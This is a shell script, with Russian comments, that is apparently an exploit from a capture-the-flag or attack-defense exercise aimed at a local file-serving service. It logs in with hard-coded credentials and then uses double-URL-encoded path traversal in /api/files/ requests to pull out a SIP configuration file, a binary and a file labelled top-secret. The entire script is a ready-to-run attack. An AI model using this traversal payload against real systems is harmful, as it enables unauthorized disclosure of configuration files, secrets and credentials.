#!/usr/bin/env sh

TARGET="http://localhost:8080"
USER="warden@myt.local"
PASS="mytpass123"
OUTPUT_DIR="./tmp"

login_and_get_cookie() {
  mkdir -p "$OUTPUT_DIR"
  curl -s -c "$OUTPUT_DIR/exploit_cookie.txt" \
    -X POST "$TARGET/api/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$USER\",\"password\":\"$PASS\"}" >/dev/null
}

exploit_traversal() {
  local path="$1"
  # Извлекаем имя файла из пути (после последнего '/')
  local filename
  filename="$(basename "$path")"

  # Заменяем потенциально опасные символы в имени файла (на всякий случай)
  filename="$(printf '%s' "$filename" | tr -cd 'a-zA-Z0-9._-')"

  local output_path="$OUTPUT_DIR/$filename"

  echo "[*] Запрашиваем $path → $output_path"
  curl -s -b "$OUTPUT_DIR/exploit_cookie.txt" "$TARGET$path" -o "$output_path"

  # Проверим, не пустой ли файл (например, ошибка 404)
  if [ ! -s "$output_path" ]; then
    echo "    ⚠️  Файл $output_path пуст (возможно, ошибка или недоступен)"
  fi
}

main() {
  echo "[*] Логинимся как $USER..."
  login_and_get_cookie

  echo "[*] Пытаемся достать sip.conf... (sploit)"
  exploit_traversal "/api/files/VOIP/%252e%252e%252fVOIP/sip.conf"

  echo "\n[*] Пытаемся достать search_engine... (sploit)"
  exploit_traversal "/api/files/VOIP/%252e%252e%252fVOIP/search_engine"

  echo "\n[*] Пытаемся достать секреты... (sploit)"
  exploit_traversal "/api/files/CCTV/%252e%252e%252fCCTV/TOP-SECRET-07.12.2025.webp"

  echo "\n[+] Готово. Файлы сохранены в $OUTPUT_DIR/"
}

main "$@"
